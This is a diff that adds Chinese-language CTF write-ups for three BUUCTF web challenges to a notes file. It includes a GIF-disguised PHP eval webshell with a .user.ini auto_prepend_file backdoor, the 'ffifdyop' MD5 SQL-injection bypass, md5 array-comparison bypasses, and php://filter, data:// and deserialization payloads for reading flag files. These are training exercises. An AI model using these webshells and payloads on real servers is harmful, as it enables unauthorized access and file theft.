@@ -370,6 +370,264 @@ if (isset($_POST['password'])) {
 
 
 
+## [SUCTF 2019]CheckIn
+
+先上传一个一句话木马，文件名webshell.jpg
+
+```
+GIF89a?
+<script language="php">@eval($_REQUEST['x']);</script>
+```
+
+再上传.user.ini文件，文件内容：
+
+```
+auto_prepend_file=webshell.jpg
+```
+
+> 形成后门原理就是会在执行所有的php文件之前包含.user.ini所指定的文件
+
+这里的条件：
+
+- 1、服务器脚本语言为PHP 
+- 2、服务器使用CGI／FastCGI模式
+- 3、上传目录下要有可执行的php文件
+
+再用蚁剑连接
+
+```
+http://0619ccaf-57a0-45a8-9799-c6c96e0cbac3.node3.buuoj.cn/uploads/852aff287f54bca0ed7757a702913e50/index.php
+```
+
+
+
+
+
+## [BJDCTF2020]Easy MD5
+
+### 考点：password='".md5($pass,true)."'
+
+参考：https://www.jianshu.com/p/12125291f50d
+
+**ffifdyop**：这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，
+而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是1select * from 'admin' where password='' or '6xxxxx'
+
+等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数
+
+password='".md5($pass,true)."'
+
+#### 第一步，输入ffifdyop
+
+得到了下一个的地址：levels91.php
+
+![BUUCTF[BJDCTF2020]Easy MD5 1](images/BUUCTF.assets/BUUCTF%5BBJDCTF2020%5DEasy%20MD5%201.png)
+
+#### 第二步，数组绕过
+
+查看源码，发现提示
+
+![BUUCTF[BJDCTF2020]Easy MD5 2](images/BUUCTF.assets/BUUCTF%5BBJDCTF2020%5DEasy%20MD5%202.png)
+
+```
+$a = $GET['a'];
+$b = $_GET['b'];
+
+if($a != $b && md5($a) == md5($b)){
+    // wow, glzjin wants a girl friend.
+```
+
+这里我们数组绕过，得到下一个的地址levell14.php
+
+```
+?a[]=1&b[]=2
+```
+
+![BUUCTF[BJDCTF2020]Easy MD5 3](images/BUUCTF.assets/BUUCTF%5BBJDCTF2020%5DEasy%20MD5%203.png)
+
+#### 第三步，代码审计
+
+进入就是代码审计了
+
+```
+<?php
+error_reporting(0);
+include "flag.php";
+
+highlight_file(__FILE__);
+
+if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
+    echo $flag;
+}
+```
+
+一样的数组绕过
+
+```
+param1[]=1&param2[]=2
+```
+
+![BUUCTF[BJDCTF2020]Easy MD5 4](images/BUUCTF.assets/BUUCTF%5BBJDCTF2020%5DEasy%20MD5%204.png)
+
+
+
+
+
+## [ZJCTF 2019]NiZhuanSiWei
+
+题目给了源码，我们查看一下
+
+```php
+ <?php  
+$text = $_GET["text"];
+$file = $_GET["file"];
+$password = $_GET["password"];
+if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
+    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
+    if(preg_match("/flag/",$file)){
+        echo "Not now!";
+        exit(); 
+    }else{
+        include($file);  //useless.php
+        $password = unserialize($password);
+        echo $password;
+    }
+}
+else{
+    highlight_file(__FILE__);
+}
+?> 
+```
+
+#### 第一步
+
+首先就是需要让$text等于：”welcome to the zjctf“ 
+
+这里可以用php://input伪协议在以POST形式传入“ welcome to the zjctf "  也可以用data伪协议传参
+
+```
+?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
+```
+
+#### 第二步
+
+直接正则过滤掉flag关键字，提示一个useless.php，于是我们用php://filter协议来读取
+
+结合题目构造payload
+
+```
+?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/read=convert.base64-encode/resource=useless.php
+```
+
+#### 第三步
+
+用base64解码获得useless.php的源码
+
+```php
+<?php  
+class Flag{  //flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this->file)){  
+            echo file_get_contents($this->file); 
+            echo "<br>";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        }  
+    }  
+}  
+?>
+```
+
+这里就是php反序列化了，我们到在线php平台构造一下
+
+```php
+<?php  
+class Flag{
+    public $file='flag.php';  
+    public function __tostring(){  
+        if(isset($this->file)){  
+            echo file_get_contents($this->file); 
+            echo "<br>";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        }  
+    }  
+} 
+$password=new Flag();
+$password = serialize($password);
+echo $password; 
+?>
+//得到：O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
+```
+
+最后的payload，flag再注释里
+
+```
+?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 # Crypto
 
 ## MD5
